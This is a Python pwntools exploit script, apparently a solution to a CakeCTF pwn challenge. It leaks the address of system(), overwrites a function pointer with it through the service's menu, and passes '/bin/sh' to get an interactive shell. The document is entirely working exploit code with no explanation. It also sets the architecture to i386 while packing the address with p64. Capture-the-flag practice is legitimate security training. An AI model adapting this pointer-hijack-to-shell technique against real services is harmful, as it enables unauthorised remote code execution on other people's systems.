#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = ""
HOST = "pwn.cakectf.com"
PORT = 9001

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

def exploit():
	conn.recvuntil("<system> = ")
	addr_system = int(conn.recvline(), 16)
	conn.sendlineafter(">", "3")
	conn.sendlineafter(">", "2")
	conn.sendlineafter(":", p64(addr_system))
	conn.sendlineafter(">", "2")
	conn.sendlineafter(":", "/bin/sh")
	conn.sendlineafter(">", "1")

	conn.interactive()	

if __name__ == "__main__":
	exploit()	
